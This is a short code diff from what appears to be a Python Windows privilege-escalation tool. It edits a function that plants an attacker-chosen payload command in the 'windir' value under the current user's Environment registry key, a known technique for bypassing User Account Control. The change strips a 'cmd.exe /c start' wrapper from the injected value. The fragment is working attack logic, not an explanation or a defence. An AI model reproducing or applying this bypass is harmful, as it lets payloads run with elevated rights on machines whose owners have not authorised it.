@@ -149,7 +149,7 @@ def uac4_cleanup(path):
 def uac4(payload):
     path = "Environment"
 
-    if modify_key(hkey="hkcu", path=path, name="windir", value=f'cmd.exe /c start "" "{" ".join(payload)}" &&', create=True):
+    if modify_key(hkey="hkcu", path=path, name="windir", value=f'"{" ".join(payload)}" &&', create=True):
         log.info(f"Successfully created WINDIR key containing payload ({' '.join(payload)})")
     else:
         log.error("Unable to create registry keys")
